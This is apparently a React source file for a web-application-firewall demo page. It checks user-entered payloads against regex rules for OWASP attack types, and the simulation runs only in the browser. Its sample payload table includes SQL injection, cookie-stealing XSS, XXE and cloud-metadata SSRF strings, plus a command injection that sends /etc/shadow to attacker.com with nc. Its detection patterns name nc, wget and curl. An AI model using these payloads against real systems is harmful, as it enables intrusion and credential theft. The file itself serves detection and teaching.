'use client'
import { useState } from 'react'
import type { SimAttackType, SimResult } from '@/types'

const SIM_RULES: Record<SimAttackType, { name: string; conf: number; patterns: RegExp[] }> = {
    sqli: { name: 'SQL Injection (OWASP A03)', conf: 97, patterns: [/'|--|;|union|select|drop|insert|delete|exec|xp_/i] },
    xss: { name: 'Cross-Site Scripting (A03)', conf: 93, patterns: [/<script|onerror|onload|javascript:|<img|alert\(/i] },
    path: { name: 'Path Traversal (A05)', conf: 91, patterns: [/\.\.[/\\]|etc\/passwd|win\.ini|boot\.ini/i] },
    cmd: { name: 'Command Injection (A03)', conf: 96, patterns: [/;|\|&|`|\$\(|nc |wget |curl /i] },
    csrf: { name: 'CSRF Attack (A01)', conf: 78, patterns: [/csrf|xsrf|forged/i] },
    xxe: { name: 'XXE Injection (A05)', conf: 90, patterns: [/<!entity|system\s*"|doctype/i] },
    ssrf: { name: 'SSRF (A10)', conf: 94, patterns: [/169\.254\.|10\.|192\.168\.|localhost|metadata/i] },
    brute: { name: 'Brute Force (A07)', conf: 88, patterns: [/admin|root|password|123|qwerty|letmein/i] },
}

const PAYLOADS: Record<SimAttackType, string> = {
    sqli: "' OR '1'='1'; DROP TABLE users;--",
    xss: "<script>alert(document.cookie)</script>",
    path: "../../etc/passwd",
    cmd: "; cat /etc/shadow | nc attacker.com 4444",
    csrf: "<form action='/transfer' method='POST'>...",
    xxe: '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
    ssrf: "http://169.254.169.254/latest/meta-data/",
    brute: "admin / password123",
}

const LABELS: Record<SimAttackType, string> = {
    sqli: 'SQL Injection (A03)',
    xss: 'Cross-Site Scripting (A03)',
    path: 'Path Traversal (A05)',
    cmd: 'Command Injection (A03)',
    csrf: 'CSRF (A01)',
    xxe: 'XXE Injection (A05)',
    ssrf: 'SSRF (A10)',
    brute: 'Brute Force (A07)',
}

export default function SimulatePage() {
    const [type, setType] = useState<SimAttackType>('sqli')
    const [endpoint, setEndpoint] = useState('/api/login')
    const [method, setMethod] = useState('POST')
    const [payload, setPayload] = useState(PAYLOADS['sqli'])
    const [result, setResult] = useState<SimResult | null>(null)
    const [loading, setLoading] = useState(false)

    const loadPayload = (t: SimAttackType) => { setType(t); setPayload(PAYLOADS[t]); setResult(null) }

    const simulate = () => {
        if (!payload.trim()) return
        setLoading(true); setResult(null)
        setTimeout(() => {
            const sig = SIM_RULES[type]
            const detected = sig.patterns.some(p => p.test(payload))
            const conf = detected ? sig.conf : Math.floor(Math.random() * 15) + 2
            const risk = detected ? Math.round(conf * 0.98) : Math.floor(Math.random() * 15) + 2
            setResult({
                detected,
                attackType: LABELS[type],
                endpoint: `${method} ${endpoint}`,
                method, payload,
                riskScore: risk,
                confidence: conf,
                rulesTriggered: [
                    { name: sig.name, match: detected },
                    { name: 'Signature DB v4.1', match: detected },
                    { name: 'Anomaly Score >80', match: detected && conf > 80 },
                ],
            })
            setLoading(false)
        }, 700)
    }

    return (
        <div className="animate-fadein">
            <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">

                {/* ── Left: Config ─── */}
                <div className="space-y-4">
                    <div className="bg-bg2 border border-border1 rounded-xl overflow-hidden">
                        <div className="px-4 py-3 border-b border-border1">
                            <span className="text-[12.5px] font-semibold text-slate-300">Attack Configuration</span>
                        </div>
                        <div className="p-4 space-y-4">
                            <div>
                                <label className="block text-xs text-text2 mb-1.5 uppercase tracking-wider">Attack Type (OWASP)</label>
                                <select className="inp w-full" value={type} onChange={e => loadPayload(e.target.value as SimAttackType)}>
                                    {(Object.keys(LABELS) as SimAttackType[]).map(k => (
                                        <option key={k} value={k}>{LABELS[k]}</option>
                                    ))}
                                </select>
                            </div>
                            <div>
                                <label className="block text-xs text-text2 mb-1.5 uppercase tracking-wider">Target Endpoint</label>
                                <input className="inp w-full" value={endpoint} onChange={e => setEndpoint(e.target.value)} />
                            </div>
                            <div>
                                <label className="block text-xs text-text2 mb-1.5 uppercase tracking-wider">HTTP Method</label>
                                <select className="inp w-full" value={method} onChange={e => setMethod(e.target.value)}>
                                    {['POST', 'GET', 'PUT', 'DELETE', 'PATCH'].map(m => <option key={m}>{m}</option>)}
                                </select>
                            </div>
                            <div>
                                <label className="block text-xs text-text2 mb-1.5 uppercase tracking-wider">Payload</label>
                                <textarea
                                    rows={4}
                                    className="w-full bg-bg3 border border-border1 rounded-lg p-3 text-[12px] font-mono text-red-300 resize-y outline-none focus:border-blue transition-colors"
                                    value={payload}
                                    onChange={e => setPayload(e.target.value)}
                                />
                            </div>
                            <button
                                onClick={simulate}
                                disabled={loading}
                                className="w-full py-2.5 bg-blue hover:bg-blue/90 text-white font-semibold rounded-lg transition-colors disabled:opacity-60 text-sm"
                            >
                                {loading ? 'Analyzing…' : '⚡ Run Attack Simulation'}
                            </button>
                        </div>
                    </div>

                    {/* Quick payloads */}
                    <div className="bg-bg2 border border-border1 rounded-xl overflow-hidden">
                        <div className="px-4 py-3 border-b border-border1">
                            <span className="text-[12.5px] font-semibold text-slate-300">Quick Payloads</span>
                        </div>
                        <div className="p-3 space-y-1">
                            {(Object.keys(LABELS) as SimAttackType[]).map(k => (
                                <button
                                    key={k}
                                    onClick={() => loadPayload(k)}
                                    className={`w-full text-left px-3 py-2 rounded-lg text-[12px] transition-colors ${type === k ? 'bg-blue-dim text-blue' : 'text-text3 hover:bg-white/[.03] hover:text-text2'}`}
                                >
                                    {LABELS[k]}
                                </button>
                            ))}
                        </div>
                    </div>
                </div>

                {/* ── Right: Result ─── */}
                <div>
                    <div className="bg-bg2 border border-border1 rounded-xl overflow-hidden h-full">
                        <div className="px-4 py-3 border-b border-border1">
                            <span className="text-[12.5px] font-semibold text-slate-300">Simulation Result</span>
                        </div>
                        <div className="p-4">
                            {!result && !loading && (
                                <div className="flex flex-col items-center justify-center py-16 text-text3 text-sm gap-2">
                                    <span className="text-3xl opacity-30">⚡</span>
                                    Configure and run a simulation to see results
                                </div>
                            )}

                            {loading && (
                                <div className="flex items-center justify-center py-16 text-text3 text-sm gap-2">
                                    <div className="w-4 h-4 border-2 border-border2 border-t-blue rounded-full animate-spin" />
                                    Analyzing payload…
                                </div>
                            )}

                            {result && (
                                <div className="space-y-4 animate-fadein">
                                    {/* Verdict */}
                                    <div className={`rounded-xl p-4 border ${result.detected ? 'bg-red-950/40 border-red-900/30' : 'bg-green-950/40 border-green-900/30'}`}>
                                        <div className="flex items-center gap-3 mb-3">
                                            <span className="text-2xl">{result.detected ? '⛔' : '✅'}</span>
                                            <span className={`text-sm font-semibold ${result.detected ? 'text-red-300' : 'text-green-400'}`}>
                                                {result.detected ? 'ATTACK BLOCKED — HTTP 403 Forbidden' : 'REQUEST ALLOWED — HTTP 200 OK'}
                                            </span>
                                        </div>
                                        <div className="space-y-2 text-[12px]">
                                            {[
                                                ['Attack Type', result.attackType],
                                                ['Endpoint', result.endpoint],
                                            ].map(([k, v]) => (
                                                <div key={k} className="flex justify-between">
                                                    <span className="text-text3">{k}</span>
                                                    <span className="text-text2">{v}</span>
                                                </div>
                                            ))}
                                            <div className="flex justify-between">
                                                <span className="text-text3">Risk Score</span>
                                                <span className={`font-semibold ${result.riskScore > 80 ? 'text-red-400' : result.riskScore > 50 ? 'text-amber-400' : 'text-green-400'}`}>
                                                    {result.riskScore}/100
                                                </span>
                                            </div>
                                            <div className="flex items-center justify-between gap-3">
                                                <span className="text-text3 flex-shrink-0">Confidence</span>
                                                <div className="flex items-center gap-2 flex-1 justify-end">
                                                    <div className="w-24 h-1.5 bg-border1 rounded-full overflow-hidden">
                                                        <div
                                                            className={`h-full rounded-full ${result.detected ? 'bg-red-500' : 'bg-green-500'}`}
                                                            style={{ width: `${result.confidence}%` }}
                                                        />
                                                    </div>
                                                    <span className={result.detected ? 'text-red-400' : 'text-green-400'}>{result.confidence}%</span>
                                                </div>
                                            </div>
                                        </div>
                                    </div>

                                    {/* Rules triggered */}
                                    <div>
                                        <div className="text-[10.5px] text-text3 uppercase tracking-[.7px] font-medium mb-2">Rules Evaluated</div>
                                        <div className="bg-bg3 rounded-xl overflow-hidden divide-y divide-border1/50">
                                            {result.rulesTriggered.map(r => (
                                                <div key={r.name} className="flex items-center gap-3 px-4 py-2.5 text-[12px]">
                                                    <span className={r.match ? 'text-red-400' : 'text-green-400'}>{r.match ? '✕' : '✓'}</span>
                                                    <span className="text-text2">{r.name}</span>
                                                    <span className={`ml-auto text-[10px] ${r.match ? 'text-red-400' : 'text-green-400'}`}>
                                                        {r.match ? 'TRIGGERED' : 'PASSED'}
                                                    </span>
                                                </div>
                                            ))}
                                        </div>
                                    </div>

                                    {result.detected && (
                                        <div className="text-[11px] text-text3 text-center bg-bg3 rounded-lg py-3">
                                            Request logged · IP flagged · Zero traffic passed to origin
                                        </div>
                                    )}
                                </div>
                            )}
                        </div>
                    </div>
                </div>
            </div>
        </div>
    )
}